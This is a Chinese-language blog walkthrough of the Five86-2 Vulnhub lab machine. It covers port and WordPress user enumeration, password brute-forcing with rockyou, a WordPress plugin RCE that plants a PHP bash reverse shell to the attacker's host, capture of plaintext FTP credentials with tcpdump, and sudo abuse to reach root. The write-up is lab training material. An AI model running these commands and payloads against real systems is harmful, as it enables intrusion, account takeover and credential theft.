---
layout: post
title: "five86-2 walkthrough"
date: 2021-06-25
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP              |
| ------------- | --------------- |
| 本机（Win10） | `192.168.36.234` |
| Kali          | `192.168.36.89` |
| Five86-2      | `192.168.36.165` |

### 扫描端口和版本信息

`nmap -A 192.168.36.165`

```bash
┌──(root💀kali)-[~]
└─# nmap -A 192.168.36.165
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 07:32 UTC
Nmap scan report for 192.168.36.165
Host is up (0.014s latency).
Not shown: 997 filtered ports
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      ProFTPD 1.3.5e
80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.1.4
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Five86-2 &#8211; Just another WordPress site
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.4
Network Distance: 1 hop
Service Info: OS: Unix
```

根据扫描结果可知靶机开启**21**、**80**端口，并且使用WordPress CMS，版本号为5.1.4。通过*searchsploit* 未找到有关ProFTPD 1.3.5e软件漏洞，此外网站使用WordPress，使用*wpscan*工具进行扫描

```bash
┌──(root💀kali)-[~]
└─# wpscan --url  http://192.168.36.165 -e u
...
[i] User(s) Identified:

[+] barney
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gillian
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] stephen
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

扫描结果可知有5个用户：`admin/gillian/peter/barney/stephen`，尝试*sqlmap*工具进行注入后无果，那么就只能进行暴力破解。将用户名保存到*user.txt*文件，使用*wpscan*进行暴力破解攻击

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.36.165 -U user.txt -P /usr/share/wordlists/Passwords/Leaked-Databases/rockyou.txt
...
[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - barney / spooky1
[SUCCESS] - stephen / apollo1
...
```

5个用户中爆破出两个用户名的密码：*barney:spooky1*、*stephen:apollo1*

### 访问Web并登录

使用*barney:spooky1*账户名和密码进行登录，在后台中可以看到WordPress安装了4个插件，并启用了*Insert or Embed Articulate Content into WordPress Trial*插件，并注意到插件版本号为*4.2995*。比较幸运的是在[exploit-db](https://www.exploit-db.com/exploits/46981)网站中找到该插件的RCE漏洞，该漏洞表现在上传压缩文件时可以执行PHP文件，接下来就进行漏洞描述进行操作即可。

在*index.php*文件中写入反向shell：`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.36.89/5566 0>&1'");`，接下来浏览器访问*http://192.168.36.165/wp-content/uploads/articulate_uploads/poc1/index.php*即可

```shell
┌──(root💀kali)-[~]
└─# nc -lvp 5566
listening on [any] 5566 ...
192.168.36.165: inverse host lookup failed: Unknown host
connect to [192.168.36.89] from (UNKNOWN) [192.168.36.165] 34732
bash: cannot set terminal process group (951): Inappropriate ioctl for device
bash: no job control in this shell
www-data@five86-2:/var/www/html/wp-content/uploads/articulate_uploads/poc6$ ls
<html/wp-content/uploads/articulate_uploads/poc6$ ls
index.html
index.php
```

### 提权

使用*stephen:apollo1*账户名和密码进行登录时返回空shell，通过python3引入合适的shell：`python3 -c 'import pty;pty.spawn("/bin/bash")'`

```
www-data@five86-2:/home$ su stephen
su stephen
Password: apollo1
python3 -c 'import pty;pty.spawn("/bin/bash")'
stephen@five86-2:/home$ id
id
uid=1002(stephen) gid=1002(stephen) groups=1002(stephen),1009(pcap)
```

在使用*id*命令查看当前用户的userID、groupID和其他ID时注意到该用户所属pcap，表示该用户可以进行抓包，`ip add`命令查看网络接口

```
stephen@five86-2:/home$ ip add
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:19:07:84 brd ff:ff:ff:ff:ff:ff
    inet 192.168.36.165/24 brd 192.168.36.255 scope global dynamic eth0
       valid_lft 80256sec preferred_lft 80256sec
    inet6 fe80::a00:27ff:fe19:784/64 scope link
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:54:5a:4f:6f brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-eca3858d86bf: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:08:d5:e4:33 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf
       valid_lft forever preferred_lft forever
    inet6 fe80::42:8ff:fed5:e433/64 scope link
       valid_lft forever preferred_lft forever
6: veth3276e15@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-eca3858d86bf state UP group default
    link/ether 16:47:89:2d:0a:e9 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::1447:89ff:fe2d:ae9/64 scope link
       valid_lft forever preferred_lft forever
```

在网络接口**veth3276e15**上进行抓包，并将结果保存在*result.pcap*中

```
stephen@five86-2:~$ timeout 120 tcpdump -w result.pcap -i veth3276e15
timeout 120 tcpdump -w result.pcap -i veth3276e15
tcpdump: listening on veth3276e15, link-type EN10MB (Ethernet), capture size 262144 bytes
43 packets captured
43 packets received by filter
0 packets dropped by kernel
```

使用*tcpdump*工具查看数据包

```shell
stephen@five86-2:~$ tcpdump -r result.pcap | more
tcpdump -r result.pcap | more
reading from file result.pcap, link-type EN10MB (Ethernet)
08:40:04.603751 IP 172.18.0.10.ftp-data > five86-2.33331: Flags [S], seq 1149527455, win 64240, options [mss 1460,sackOK,TS val 1124364455 ecr 0,nop,wscale 7], length 0
08:40:06.683349 ARP, Request who-has 172.18.0.10 tell five86-2, length 28
...
08:42:01.323775 IP five86-2.41354 > 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 5--More--
8, win 502, options [nop,nop,TS val 2633646929 ecr 1124481170], length 11: FTP: --More--
USER paul
...
08:42:01.333483 IP five86-2.41354 > 172.18.0.10.ftp: Flags [P.], seq 12:33, ack --More--
90, win 502, options [nop,nop,TS val 2633646939 ecr 1124481185], length 21: FTP:--More--
 PASS esomepasswford
```

从结果中可知，在该网络接口传输中使用的协议是*ftp*，并在其中找到账户名和密码：`paul:esomepasswford`。

```shell
stephen@five86-2:~$ su paul
su paul
Password: esomepasswford

paul@five86-2:/home/stephen$ id
id
uid=1006(paul) gid=1006(paul) groups=1006(paul),1010(ncgroup)
paul@five86-2:/home/stephen$ sudo -l
sudo -l
Matching Defaults entries for paul on five86-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User paul may run the following commands on five86-2:
    (peter) NOPASSWD: /usr/sbin/service
```

切换到该账户下后注意到该账户可以使用*/usr/sbin/service*，再一次进行提权

```shell
paul@five86-2:/home/stephen$ sudo -u peter /usr/sbin/service ../../bin/bash
sudo -u peter /usr/sbin/service ../../bin/bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

peter@five86-2:/$ id
id
uid=1003(peter) gid=1003(peter) groups=1003(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd),1010(ncgroup)
peter@five86-2:/$ sudo -l
sudo -l
Matching Defaults entries for peter on five86-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User peter may run the following commands on five86-2:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/passwd
```

最终该用户*peter*可以*sudo*执行任意命令，因此通过修改*root*账户的密码后查看flag即可

```shell
root@five86-2:~# cat thisistheflag.txt
cat thisistheflag.txt

__   __            _                           _                                 _ _ _ _ _
\ \ / /           | |                         | |                               | | | | | |
 \ V /___  _   _  | |__   __ ___   _____    __| | ___  _ __   ___  __      _____| | | | | |
  \ // _ \| | | | | '_ \ / _` \ \ / / _ \  / _` |/ _ \| '_ \ / _ \ \ \ /\ / / _ \ | | | | |
  | | (_) | |_| | | | | | (_| |\ V /  __/ | (_| | (_) | | | |  __/  \ V  V /  __/ | |_|_|_|
  \_/\___/ \__,_| |_| |_|\__,_| \_/ \___|  \__,_|\___/|_| |_|\___|   \_/\_/ \___|_|_(_|_|_)


Congratulations - hope you enjoyed Five86-2.
```

